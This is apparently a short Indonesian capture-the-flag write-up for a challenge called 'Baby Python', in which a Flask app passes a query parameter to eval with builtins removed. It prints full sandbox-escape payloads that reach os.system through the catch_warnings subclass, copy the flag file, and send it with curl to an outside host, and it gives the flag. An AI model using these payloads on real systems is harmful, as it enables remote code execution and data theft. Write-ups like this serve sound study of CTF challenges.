# Baby Python

Diberikan source code dari web aplikasi (python) sebagai berikut :

```python
from flask import Flask,request

app = Flask(__name__)

@app.route("/")
def index():
    req = request.args.get("baby","True")
    print(req)
    eval(req,{"__builtins__":{}},{})
    return "OK"

if __name__ == "__main__":
    app.run()
```

Pada source code tersebut terdapat fungsi eval, akan tetapi pada fungsi tersebut kami tidak bisa langsung melakukan code execution karena adanya parameter globals yang dibatasi. Kami menggunakan subclass catch_warnings untuk melakukan import modul os dan menjalankan command execution. Berikut payload final yang kami gunakan :

```
http://103.146.203.17:3003/?baby=[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cp /flag* /tmp/asu')

http://103.146.203.17:3003/?baby=[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('curl ip:1333 --data @/tmp/asu')
```

Flag: IFEST2020{5d89320ac7ab789ac1beb60c294f526e}
